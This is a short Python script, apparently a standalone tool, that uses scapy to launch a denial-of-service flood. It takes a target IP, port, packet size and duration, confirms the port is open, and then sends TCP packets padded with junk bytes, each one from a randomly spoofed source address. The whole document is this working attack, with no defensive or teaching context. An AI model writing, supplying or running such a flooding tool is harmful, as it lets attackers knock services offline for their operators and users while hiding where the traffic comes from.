import argparse
from scapy.all import *

def ddos(target_ip, target_port, packet_size, duration):
    print(f"DDOSING {target_ip} on port {target_port} for {duration} seconds with {packet_size}-byte packets")

    start_time = time.time()
    while time.time() - start_time < duration:
        source_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        packet = IP(src=source_ip, dst=target_ip) / TCP(dport=target_port) / Raw(b"X" * packet_size)
        send(packet, verbose=False)

    print("DDoS attack finished")

def main(target_ip, target_port, packet_size, duration):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(5)
        s.connect((target_ip, target_port))
    except ConnectionRefusedError:
        print("Error: Connection refused")
        return
    except TimeoutError:
        print("Error: Connection timed out")
        return
    else:
        print(f"Connected to {target_ip}:{target_port}")
    
    s.close()

    ddos(target_ip, target_port, packet_size, duration)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="target IP address")
    parser.add_argument("port", type=int, help="target port number")
    parser.add_argument("packet_size", type=int, help="size of the packets to send (in bytes)")
    parser.add_argument("duration", type=int, help="duration of the DDoS attack (in seconds)")
    args = parser.parse_args()

    main(args.ip, args.port, args.packet_size, args.duration)
